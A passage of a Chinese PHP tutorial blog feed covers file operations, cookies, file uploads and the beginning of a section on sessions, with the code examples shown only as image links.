src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142449.png" alt="" loading="lazy"></p><h2 id="递归实现的条件"><a href="#递归实现的条件" class="headerlink" title="递归实现的条件"></a>递归实现的条件</h2><p>确定递归公式；</p><p>确定递归边界条件==(<strong>递归出口</strong>)==，否则会出现死循环。</p><h2 id="递归遍历phpMyAdmin目录下所有条目"><a href="#递归遍历phpMyAdmin目录下所有条目" class="headerlink" title="递归遍历phpMyAdmin目录下所有条目"></a>递归遍历phpMyAdmin目录下所有条目</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142537.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142547.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142556.png" alt="" loading="lazy"></p><h1 id="PHP操作文件"><a href="#PHP操作文件" class="headerlink" title="PHP操作文件"></a>PHP操作文件</h1><h2 id="打开文件fopen"><a href="#打开文件fopen" class="headerlink" title="打开文件fopen()"></a>打开文件fopen()</h2><p>描述：打开文件或者 URL</p><p>语法：<code>resource fopen ( string $filename , string $mode )</code></p><p>参数：<code>$filename</code>，指定要打开的目标文件或URL；$mode，指定文件的打开方式。</p><p>提示：==为移植性考虑，在用 fopen()打开文件时总是使用 ‘b’ 标记。binary==</p><p>返回值：成功时返回文件指针资源，如果打开失败，本函数返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142742.png" alt="" loading="lazy"></p><p>==以写入方式打开，它自动创建文件==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142758.png" alt="" loading="lazy"></p><h2 id="打开文件的方式"><a href="#打开文件的方式" class="headerlink" title="打开文件的方式"></a>打开文件的方式</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142819.png" alt="" loading="lazy"></p><h2 id="关闭文件fclose"><a href="#关闭文件fclose" class="headerlink" title="关闭文件fclose()"></a>关闭文件fclose()</h2><p>描述：关闭一个已打开的文件指针</p><p>语法：<strong><code>bool fclose ( resource $handle )</code></strong></p><p>参数：$handle必须是由fopen()打开的文件指针。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142910.png" alt="" loading="lazy"></p><h2 id="读取指定大小文件内容fread"><a href="#读取指定大小文件内容fread" class="headerlink" title="读取指定大小文件内容fread()"></a>读取指定大小文件内容fread()</h2><p>描述：读取文件（可安全用于二进制文件） </p><p>语法：<strong><code>string fread ( resource $handle , int $length )</code></strong></p><p>参数：$handle是由fopen()创建的handle；$length最多读取的字节数。</p><p>提示：在区分二进制文件和文本文件的系统上（如 Windows）打开文件时，fopen() 函数的 mode 参数要加上 ‘b’。</p><p>返回值：返回所读取的字符串， 或者在失败时返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528142955.png" alt="" loading="lazy"></p><h2 id="读取一行内容fgets"><a href="#读取一行内容fgets" class="headerlink" title="读取一行内容fgets()"></a>读取一行内容fgets()</h2><p>描述：从文件指针中读取一行</p><p>语法：<strong><code>string fgets ( resource $handle [, int $length ] )</code></strong></p><p>参数：</p><ul><li><p>$handle：文件指针必须是有效的</p></li><li><p>$length：从 handle指向的文件中读取一行并返回长度最多为 length - 1 字节的字符串。==碰到换行符（包括在返回值中）、EOF 或者已经读取了 length - 1 字节后停止==（看先碰到那一种情况）。如果没有指定 length，则默认为 1K，或者说 1024 字节。 </p></li></ul><p>返回值：从指针 handle 指向的文件中读取了 length - 1 字节后返回字符串。 如果文件指针中没有更多的数据了则返回 FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143101.png" alt="" loading="lazy"></p><h2 id="读取文件内容到数组中file"><a href="#读取文件内容到数组中file" class="headerlink" title="读取文件内容到数组中file()"></a>读取文件内容到数组中file()</h2><p>描述：把整个文件读入一个数组中</p><p>语法： <strong><code>array file ( string $filename [, int $flags = 0 ] )</code></strong></p><p>参数：</p><ul><li><p>$filename，文件的路径；</p></li><li><p>$flags，附加选项；</p></li><li><p>FILE_USE_INCLUDE_PATH(1)：在include_path 中查找文件； </p></li><li><p>FILE_IGNORE_NEW_LINES(2)：在数组的每个元素末尾不添加换行符；</p></li><li><p>FILE_SKIP_EMPTY_LINES(4)：跳过空行。</p><p>注意：==不需要打开文件和关闭文件。==</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143325.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143333.png" alt="" loading="lazy"></p><h2 id="读取文件内容到字符串中file-get-contents"><a href="#读取文件内容到字符串中file-get-contents" class="headerlink" title="读取文件内容到字符串中file_get_contents()"></a>读取文件内容到字符串中file_get_contents()</h2><p>描述：将整个文件读入一个字符串 ，不用打开文件，也不用关闭文件</p><p>语法：<strong><code>string file_get_contents ( string $filename )</code></strong></p><p>返回：返回读取的数据，或在失败时返回false。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143411.png" alt="" loading="lazy"></p><h2 id="实例：读取记事本中的内容，并用表格展示出来"><a href="#实例：读取记事本中的内容，并用表格展示出来" class="headerlink" title="实例：读取记事本中的内容，并用表格展示出来"></a>实例：读取记事本中的内容，并用表格展示出来</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143431.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143443.png" alt="" loading="lazy"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>描述：写入文件（可安全用于二进制文件）</p><p>语法：<strong><code>int fwrite ( resource $handle , string $string )</code></strong></p><p> 返回：返回写入的字符数，出现错误时则返回 FALSE 。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143528.png" alt="" loading="lazy"></p><h2 id="将一个字符串写入文件"><a href="#将一个字符串写入文件" class="headerlink" title="将一个字符串写入文件"></a>将一个字符串写入文件</h2><p>描述：和依次调用 fopen()，fwrite()以及 fclose() 功能一样。</p><p>语法：<strong><code>int file_put_contents ( string $filename , mixed $data [, int $flags = 0] )</code></strong></p><p>参数：</p><ul><li><p>$filename要被写入数据的文件名。</p></li><li><p>$data要写入的数据。类型可以是 string，array(一维数组)。</p></li><li><p>$flags附加选项。</p></li><li><p>FILE_USE_INCLUDE_PATH(1) 在 include 目录里搜索 filename</p></li><li><p>FILE_APPEND(8)如果文件 filename已经存在，==<strong>追加数据而不是覆盖</strong>。==</p></li><li><p>LOCK_EX(2)在写入时获得一个独占锁。</p><p>提示：<strong>==如果文件不存在，则会自动创建。如果文件过大，不能一次性处理==</strong>。</p><p>返回：该函数将返回写入到文件内数据的字节数，失败时返回FALSE。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143704.png" alt="" loading="lazy"></p><h2 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h2><p>描述：将文件从 source 拷贝到 dest。</p><p>语法：<strong><code>bool copy ( string $source , string $dest )</code></strong></p><p>提示：如果目标文件存在，则会覆盖。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143830.png" alt="" loading="lazy"></p><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>语法：<strong><code>bool unlink ( string $filename )</code></strong> </p><p>返回：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><p>提示：可以删除虚拟空间之外的文件，但必须使用相对路径(../)，但必须有权限。</p><p>注意：==<strong>删除的文件不会进入回收站</strong>。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528143919.png" alt="" loading="lazy"></p><h2 id="其它的文件操作函数"><a href="#其它的文件操作函数" class="headerlink" title="其它的文件操作函数"></a>其它的文件操作函数</h2><p>filesize()，可以获取文件大小，单位为字节。</p><p>is_writable()，判断文件是否可写。</p><p>is_readable()，判断文件是否可读。</p><p>feof()，判断文件指针是否到达文件结尾。</p><p>filectime()，获取创建文件的时间。</p><p>fileatime()，获取文件最新访问时间。</p><p>filemtime()，获取文件最后修改时间。</p><h1 id="综合实例：递归删除phpMyAdmin目录"><a href="#综合实例：递归删除phpMyAdmin目录" class="headerlink" title="综合实例：递归删除phpMyAdmin目录"></a>综合实例：递归删除phpMyAdmin目录</h1><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528144027.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>COOKIE</title>
      <link href="/2020/05/28/COOKIE/"/>
      <url>/2020/05/28/COOKIE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="COOKIE概述"><a href="#COOKIE概述" class="headerlink" title="COOKIE概述"></a>COOKIE概述</h1><h2 id="什么是COOKIE？"><a href="#什么是COOKIE？" class="headerlink" title="什么是COOKIE？"></a>什么是COOKIE？</h2><p>​        简单来说，==Cookies就是服务器暂时存放在你的电脑里的资料==（.txt格式的文本文件），好让服务器用来辨认你的计算机（==通常经过加密==）；</p><p>​        ==Cookie是由服务器端生成，发送给User-Agent（一般是浏览器）==，浏览器会将Cookie的key/value保存到某个目录下的文本文件内，<strong>==下次请求同一网站时就发送该Cookie给服务器==</strong>。</p><p>​         Cookie名称和值可以由服务器端开发者定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</p><p><strong>==注意：每种浏览器都可以存储COOKIE数据；各个浏览器之间的COOKIE数据不能共享。==</strong></p><h2 id="IE浏览器查看COOKIE数据"><a href="#IE浏览器查看COOKIE数据" class="headerlink" title="IE浏览器查看COOKIE数据"></a>IE浏览器查看COOKIE数据</h2><p>访问路径：==工具栏菜单 &gt;&gt; internet选项 &gt;&gt; 常规选项卡 &gt;&gt; 浏览器历史记录 &gt;&gt; 设置 &gt;&gt; 查看文件==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170335.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170347.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170357.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170414.png" alt="" loading="lazy"></p><h2 id="使用COOKIE的好处"><a href="#使用COOKIE的好处" class="headerlink" title="使用COOKIE的好处"></a>使用COOKIE的好处</h2><p>​        ==用户登录时，记住登录账号和密码，为下一次登录时简化操作；==</p><p>​        另一个重要应用场合是“购物车”之类处理。==用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。==</p><p>​        ==跟踪统计用户访问网站的习惯。==什么时间访问，访问了哪些页面，页面停留时间等，为用户提供个性化服务，为网站营销提供参考。</p><h2 id="COOKIE的工作原理"><a href="#COOKIE的工作原理" class="headerlink" title="COOKIE的工作原理"></a>COOKIE的工作原理</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170529.png" alt="" loading="lazy"></p><p>==<strong>第1次请求和第1次响应</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170557.png" alt="" loading="lazy"></p><p>==<strong>第2次请求和第2次响应</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528170644.png" alt="" loading="lazy"></p><h1 id="COOKIE操作"><a href="#COOKIE操作" class="headerlink" title="COOKIE操作"></a>COOKIE操作</h1><h2 id="添加COOKIE数据"><a href="#添加COOKIE数据" class="headerlink" title="添加COOKIE数据"></a>添加COOKIE数据</h2><p>描述：向客户端发送一个 HTTP cookie。 </p><p>语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )</code></strong></p><p> 参数：</p><ul><li><p>$name，cookie的名称；</p></li><li><p>$value，cookie的值，会自动进行 URL 编码。接收时会进行 URL 解码。==<strong>COOKIE值的类型只能是标量数据类型，不可是数组、对象、资源</strong>。==</p></li><li><p>$expire，cookie的有效期；</p></li><li><p>$path，cookie的服务器路径；</p></li><li><p>$domain，cookie的域名；</p></li><li><p>$secure，规定是否通过安全的 HTTPS 连接来传输 cookie。 </p></li></ul><p>返回：设置成功返回TRUE，失败返回FALSE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528171205.png" alt="" loading="lazy"></p><h2 id="读取COOKIE数据"><a href="#读取COOKIE数据" class="headerlink" title="读取COOKIE数据"></a>读取COOKIE数据</h2><p>描述：获取cookie数据是通过超全局数组<strong>$_COOKIE</strong>来实现的。</p><p>语法：<strong><code>value = $_COOKIE[key]</code></strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528171256.png" alt="" loading="lazy"></p><h1 id="COOKIE设置"><a href="#COOKIE设置" class="headerlink" title="COOKIE设置"></a>COOKIE设置</h1><h2 id="COOKIE过期有效性设置"><a href="#COOKIE过期有效性设置" class="headerlink" title="COOKIE过期有效性设置"></a>COOKIE过期有效性设置</h2><p><strong>1）即时性COOKIE设置</strong></p><p>描述：==默认cookie的有效期是关闭浏览器时，自动失效。==该cookie称为临时cookie；</p><p>语法：<strong><code>bool setcookie ( string $name , string $value [, int $expire = 0 ])</code></strong></p><p>参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效；</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172158.png" alt="" loading="lazy"></p><p><strong>2）有效性COOKIE设置</strong></p><p>语法： <strong><code>bool setcookie ( string $name , string $value [, int $expire = 0 ])</code></strong></p><p>参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效；</p><p>说明：$expire为一个时间戳。一般用==<strong>time()+N</strong>==表示新的时间戳。在当前时间点，再加上N秒后，产生一个新的时间戳。</p><p>==提示：一旦指定了有效的过期时间，cookie失效跟关闭浏览器无关(持久cookie)。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172313.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172326.png" alt="" loading="lazy"></p><h2 id="COOKIE路径有效性"><a href="#COOKIE路径有效性" class="headerlink" title="COOKIE路径有效性"></a>COOKIE路径有效性</h2><p>描述：设置COOKIE只能在指定的目录及其子目录下有效</p><p>语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path]]] )</code></strong></p><p>参数：==<strong>$path默认为”/“</strong>==，==代表当前网站根目录==，在当前目录及其所有子目录都可以使用。</p><p>说明：由于浏览器每次请求时，携带到服务器端很多的COOKIE数据，会导致请求数据变得庞大；将COOKIE划分到各个路径中，减少每个路径下COOKIE的数量。</p><p>==例如：京东保存在客户端的有1万个COOKIE数据，大小为100MB，每次请求都需要1个小时。这样一来，每次请求带1个万COOKIE，但是当前页码只使用2个COOKIE，造成带宽浪费。<br>解决方案是：请求页面需要什么COOKIE，就带什么COOKIE过去，有针对性，会节省宽带==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172540.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172549.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172606.png" alt="" loading="lazy"></p><h2 id="COOKIE域名有效性"><a href="#COOKIE域名有效性" class="headerlink" title="COOKIE域名有效性"></a>COOKIE域名有效性</h2><p> 描述：给一个COOKIE指定访问的域名</p><p> 语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain]]]] )</code></strong></p><p> 提示：==默认情况下，cookie只能在当前域名下有效。==</p><p> 域名划分：</p><ul><li><p>主域名：itcast.cn</p></li><li><p>一级域名：<a href="http://www.itcast.cn" target="_blank" rel="noopener">www.itcast.cn</a></p></li><li><p>二级域名：news.itcast.cn</p></li><li><p>三级域名：php.news.itcast.cn</p></li></ul><p>说明：如果COOKIE域名有效性，设置为主域名，则在所有域名下都可以使用。如果设置为子域名，则只能在子域名下使用该COOKIE。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528172747.png" alt="" loading="lazy"></p><p><strong>==第一步：修改hosts文件添加二级域名==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173025.png" alt="" loading="lazy"></p><p><strong>==第二步：将两个域名都指向同一个虚拟目录==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173052.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173104.png" alt="" loading="lazy"></p><p>==<strong>第三步：测试结果</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173128.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173140.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173200.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173212.png" alt="" loading="lazy"></p><h2 id="是否仅https安全连接才能发送cookie呢？"><a href="#是否仅https安全连接才能发送cookie呢？" class="headerlink" title="是否仅https安全连接才能发送cookie呢？"></a>是否仅https安全连接才能发送cookie呢？</h2><p>描述：==是否仅限https来发送COOKIE数据，默认情况下，为http协议发送；==</p><p>语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false]]]]] )</code></strong></p><p>https：是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL 。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173314.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173348.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173403.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173413.png" alt="" loading="lazy"></p><h2 id="是否只能通过http协议来使用COOKIE呢？"><a href="#是否只能通过http协议来使用COOKIE呢？" class="headerlink" title="是否只能通过http协议来使用COOKIE呢？"></a>是否只能通过http协议来使用COOKIE呢？</h2><p> 描述：客户端的COOKIE除了可以通过HTTP协议来使用外，还可以使用JS来使用COOKIE。</p><p>语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )</code></strong></p><p>==<strong>提示：除了COOKIE通过http发往服务器使用，JS也可以使用该COOKIE。</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173509.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173518.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173529.png" alt="" loading="lazy"></p><h1 id="删除COOKIE数据"><a href="#删除COOKIE数据" class="headerlink" title="删除COOKIE数据"></a>删除COOKIE数据</h1><h2 id="设置COOKIE有效性为过去的某一个时间"><a href="#设置COOKIE有效性为过去的某一个时间" class="headerlink" title="设置COOKIE有效性为过去的某一个时间"></a>设置COOKIE有效性为过去的某一个时间</h2><p>描述：设置有效期为过去的某一个时间</p><p>语法：<strong><code>bool setcookie ( string $name [, string $value [, int $expire = 0 ]] )</code></strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173627.png" alt="" loading="lazy"></p><h2 id="设置COOKIE的值为false或空字符串"><a href="#设置COOKIE的值为false或空字符串" class="headerlink" title="设置COOKIE的值为false或空字符串"></a>设置COOKIE的值为false或空字符串</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173645.png" alt="" loading="lazy"></p><h2 id="清理浏览器缓存"><a href="#清理浏览器缓存" class="headerlink" title="清理浏览器缓存"></a>清理浏览器缓存</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528173707.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/05/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h2><p>上传文件，就是将文件从浏览器端传到服务器端；</p><p>上传文件，必须使用<code>&lt;form&gt;</code>标记来向服务器端发数据；</p><p>上传文件，<code>&lt;form&gt;</code>标记的method属性值必须是POST；</p><p>上传文件，<code>&lt;form&gt;</code>标记的enctype属性值必须是multipart/form-data；</p><p>上传文件，必须使用<code>&lt;input type = ‘file&#39; name=&#39;upload&#39;&gt;</code>标记实现。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145037.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145044.png" alt="" loading="lazy"></p><h2 id="超全局变量数组-FILES"><a href="#超全局变量数组-FILES" class="headerlink" title="超全局变量数组 $_FILES"></a>超全局变量数组 $_FILES</h2><p>$_POST数组中保存的是普通表单元素数据；</p><p>$_FILES数组中保存的是上传文件的信息。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145131.png" alt="" loading="lazy"></p><h2 id="上传文件错误代码"><a href="#上传文件错误代码" class="headerlink" title="上传文件错误代码"></a>上传文件错误代码</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145153.png" alt="" loading="lazy"></p><p>==提示：0、1、4比较重要==</p><h2 id="查看上传的临时文件位置"><a href="#查看上传的临时文件位置" class="headerlink" title="查看上传的临时文件位置"></a>查看上传的临时文件位置</h2><p>​        上传文件的默认临时目录，如果没有指定php.ini配置项==upload_tmp_dir==的值，则使用操作系统临时目录==(c:\windows\temp)==。通过phpinfo()函数查看。</p><p>​        为什么在 c:\windows\temp 中看不到上专文件呢？==因为临时文件是短暂存在的，也就是在脚本执行完毕后，就消失了。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145312.png" alt="" loading="lazy"></p><h2 id="将上传文件移动到新位置"><a href="#将上传文件移动到新位置" class="headerlink" title="将上传文件移动到新位置"></a>将上传文件移动到新位置</h2><p>描述：本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 destination 指定的文件。最好在临时文件没有消失前移动。</p><p>语法：<code>bool move_uploaded_file ( string $filename , string $destination )</code></p><p>参数：$filename，指定上传的临时文件名；$destination，指定新的文件名路径；</p><p>==注意：如果文件已经存在，则会覆盖操作。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145405.png" alt="" loading="lazy"></p><h2 id="上传文件的相关配置-php-ini"><a href="#上传文件的相关配置-php-ini" class="headerlink" title="上传文件的相关配置(php.ini)"></a>上传文件的相关配置(php.ini)</h2><p>upload_max_filesize配置：上传单个文件的大小限制，默认为2MB。</p><p>post_max_size配置：规定上传多个文件的总大小，默认为8MB。</p><p>max_file_uploads配置：规定最多上传的文件个数，默认为20个。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145509.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145518.png" alt="" loading="lazy"></p><h2 id="获取文件路径信息-pathinfo"><a href="#获取文件路径信息-pathinfo" class="headerlink" title="获取文件路径信息 pathinfo()"></a>获取文件路径信息 pathinfo()</h2><p>描述：返回文件路径的信息 ;</p><p>语法：<strong><code>mixed pathinfo ( string $path [, int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME ] )</code></strong></p><p> 参数：</p><ul><li><p>$path，要解析的路径。 </p></li><li><p>$options，如果省略，返回全部单元；</p></li><li><p>PATHINFO_DIRNAME，目录名称；</p></li><li><p>PATHINFO_BASENAME，文件名称；</p></li><li><p>PATHINFO_EXTENSION，扩展名；</p></li><li><p>PATH_FILENAME，文件名。</p></li></ul><h2 id="检查数组中是否存在某个值-in-array"><a href="#检查数组中是否存在某个值-in-array" class="headerlink" title="检查数组中是否存在某个值 in_array()"></a>检查数组中是否存在某个值 in_array()</h2><p> 描述：检查数组中是否存在某个值</p><p> 语法：<strong><code>bool in_array ( mixed $needle , array $arr )</code></strong></p><p>参数：$needle检索的值，$arr原数组。</p><h2 id="生成唯一ID-uniqid"><a href="#生成唯一ID-uniqid" class="headerlink" title="生成唯一ID uniqid()"></a>生成唯一ID uniqid()</h2><p>描述：生成一个唯一ID</p><p>语法：<strong><code>string uniqid ([ string $prefix = &quot;&quot; [, bool $more_entropy = false ]] )</code></strong></p><p>参数：</p><ul><li><p>$prefix前缀字符串，如果省略，返回字符串长度为13；</p></li><li><p>$more_entropy后缀字符串，如果为true，返回字符串长度为23。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528145755.png" alt="" loading="lazy"></p><h1 id="单个文件上传"><a href="#单个文件上传" class="headerlink" title="单个文件上传"></a>单个文件上传</h1><h2 id="上传表单制作upload-html"><a href="#上传表单制作upload-html" class="headerlink" title="上传表单制作upload.html"></a>上传表单制作upload.html</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528150159.png" alt="" loading="lazy"></p><h2 id="上传文件的程序处理upload-php"><a href="#上传文件的程序处理upload-php" class="headerlink" title="上传文件的程序处理upload.php"></a>上传文件的程序处理upload.php</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528150217.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528150248.png" alt="" loading="lazy"></p><h1 id="多个文件上传"><a href="#多个文件上传" class="headerlink" title="多个文件上传"></a>多个文件上传</h1><p>​    </p><h2 id="制作上传表单"><a href="#制作上传表单" class="headerlink" title="制作上传表单"></a>制作上传表单</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528150317.png" alt="" loading="lazy"></p><h2 id="上传多个文件的程序处理"><a href="#上传多个文件的程序处理" class="headerlink" title="上传多个文件的程序处理"></a>上传多个文件的程序处理</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528150339.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SESSION</title>
      <link href="/2020/05/28/SESSION/"/>
      <url>/2020/05/28/SESSION/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SESSION概述"><a href="#SESSION概述" class="headerlink" title="SESSION概述"></a>SESSION概述</h1><h2 id="什么是SESSION？"><a href="#什么是SESSION？" class="headerlink" title="什么是SESSION？"></a>什么是SESSION？</h2><ul><li><p>Session对象存储特定用户的会话数据；</p></li><li><p>Session将会话数据存储在服务器端；</p></li><li><p>Session是基于Cookie技术的，没有Cookie就没有Session；</p></li><li><p>Session在整个用户会话中，一直存在下去；</p></li><li><p>一个用户会话时效：从用户登录开始，到用户登录结束；</p></li><li><p>Session存储的数据量要比cookie大的多；</p></li><li><p>Session存储的内容类型，不限于字符串；</p></li><li><p>Session数据存储在服务器端，更安全，可靠。</p></li></ul><h2 id="SESSION的工作原理"><a href="#SESSION的工作原理" class="headerlink" title="SESSION的工作原理"></a>SESSION的工作原理</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174104.png" alt="" loading="lazy"></p><h2 id="开启SESSION会话功能"><a href="#开启SESSION会话功能" class="headerlink" title="开启SESSION会话功能"></a>开启SESSION会话功能</h2><p>描述：启动新会话或者重用现有会话 ；</p><p>语法：<strong><code>bool session_start (void )</code></strong></p><p>提示：$_SESSION变量默认是不存在的，与$_POST、$_GET、$_FILES不一样。因此，必须先开启SESSION，才能使用$_SESSION变量；</p><p>提示：==每个需要SESSION数据的页面，都要开启SESSION功能；==</p><p>注意：==SESSION功能，不能重复开启(同一个页面不能开2次)；==</p><p>返回：成功开始会话返回 TRUE ，反之返回 FALSE；</p><p>==<strong>提示：SESSION文件的保存位置 c:\windows\temp</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174301.png" alt="" loading="lazy"></p><h1 id="SESSION操作"><a href="#SESSION操作" class="headerlink" title="SESSION操作"></a>SESSION操作</h1><h2 id="添加SESSION数据"><a href="#添加SESSION数据" class="headerlink" title="添加SESSION数据"></a>添加SESSION数据</h2><p> 描述：对Session的管理(增删改查)，都是通过超全局数组==<strong>$_SESSION</strong>==进行的；</p><p> 语法：<strong><code>$_SESSION[key] = value</code></strong></p><p> 提示：==一个网站不管添加多少个SESSION数据，最终在浏览器端只存储一个SESSION的ID值，==该ID值是经过加密的，并且永不重复。Key只能是String类型的数据。</p><p> SESSION文件在服务器端的存储位置：==c:\windows\temp==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174646.png" alt="" loading="lazy"></p><h2 id="读取SESSION数据"><a href="#读取SESSION数据" class="headerlink" title="读取SESSION数据"></a>读取SESSION数据</h2><p>语法：<strong><code>$value = 